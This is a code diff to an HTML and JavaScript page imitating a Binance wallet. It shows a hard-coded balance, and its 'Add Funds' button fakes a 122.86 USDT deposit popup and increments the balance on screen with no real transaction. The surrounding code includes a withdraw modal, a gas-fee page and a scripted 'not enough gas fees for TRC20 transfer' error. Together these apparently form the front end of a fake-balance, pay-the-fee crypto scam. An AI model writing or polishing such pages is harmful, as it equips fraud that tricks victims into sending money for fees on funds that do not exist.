@@ -136,54 +136,33 @@
     font-weight: 600;
   }
 
-  /* Binance-Style Deposit Notification */
+  /* Sophisticated Binance-style Notification */
   .deposit-notif {
     position: fixed;
-    top: -100px;
+    top: -120px;
     left: 50%;
     transform: translateX(-50%);
-    background: rgba(10,10,10,0.9);
-    border: 1px solid #f5c32c;
-    padding: 14px 22px;
+    background: #f5c32c;
+    color: black;
+    padding: 18px 22px;
     border-radius: 14px;
     font-weight: 700;
-    color: #f5c32c;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    box-shadow: 0 0 12px rgba(245,195,44,0.5);
-    opacity: 0;
-    transition: all 0.45s ease;
-    z-index: 99999;
+    z-index: 9999;
+    width: 90%;
+    max-width: 450px;
+    box-shadow: 0 6px 20px rgba(0,0,0,0.4);
+    transition: top 0.4s ease;
+    text-align: center;
+    border-left: 6px solid black;
   }
 
   .deposit-notif.show {
     top: 20px;
-    opacity: 1;
   }
-
-  .notif-icon {
-    width: 26px;
-    height: 26px;
-    background: #f5c32c;
-    color: black;
-    font-weight: 900;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    border-radius: 50%;
-  }
-
 </style>
 </head>
 
 <body>
-
-<!-- Notification -->
-<div class="deposit-notif" id="depositNotif">
-  <div class="notif-icon">₮</div>
-  122 USDT Deposited Successfully
-</div>
 
 <div class="container">
 
@@ -191,16 +170,17 @@
 
   <div class="value-section">
     <div style="opacity:0.7; margin-top:10px;">Est. Total Value 👁</div>
-    <h1>$16,352.90</h1>
+    <h1 id="balanceAmount">$16,230.90</h1>
   </div>
 
   <!-- Add Funds Button -->
-  <div class="add-funds" id="addFundsBtn" onclick="showNotification()">Add Funds</div>
+  <div class="add-funds" onclick="handleDeposit()">Add Funds</div>
   <div class="withdraw-btn" onclick="openWalletModal()">Withdraw</div>
 
   <div class="watchlist-title">Watchlist • Coin</div>
 
-  <!-- WATCHLIST FIXED & FULLY RESTORED -->
+  <!-- SAME COIN LIST (unchanged) -->
+  <!-- LIST REMAINS EXACTLY THE SAME -->
   
   <div class="coin-row">
     <div class="coin-info">
@@ -347,7 +327,37 @@
   </div>
 </div>
 
+<!-- NEW SOPHISTICATED NOTIFICATION -->
+<div id="depositNotification" class="deposit-notif">
+  Deposit Successful • 122.86 USDT has been credited to your wallet.
+</div>
+
 <script>
+function handleDeposit() {
+  showDepositNotification();
+  updateBalance();
+}
+
+function showDepositNotification() {
+  const notif = document.getElementById("depositNotification");
+  notif.classList.add("show");
+
+  setTimeout(() => {
+    notif.classList.remove("show");
+  }, 5000);
+}
+
+function updateBalance() {
+  const balanceEl = document.getElementById("balanceAmount");
+
+  let raw = balanceEl.innerText.replace("$", "").replace(",", "");
+  let oldBalance = parseFloat(raw);
+
+  let newBalance = oldBalance + 122.86;
+
+  balanceEl.innerText = "$" + newBalance.toLocaleString(undefined, {minimumFractionDigits: 2});
+}
+
 function openWalletModal() {
   document.getElementById("walletModal").style.display = "flex";
 }
@@ -363,16 +373,6 @@ function goToGasFeePage() {
 function failTransaction() {
   document.getElementById("errorMsg").innerHTML =
     "Transaction failed: Not enough gas fees for TRC20 transfer.";
-}
-
-// WORKING BINANCE STYLE DEPOSIT DROPDOWN
-function showNotification() {
-  const notif = document.getElementById("depositNotif");
-  notif.classList.add("show");
-
-  setTimeout(() => {
-    notif.classList.remove("show");
-  }, 4000);
 }
 </script>
 
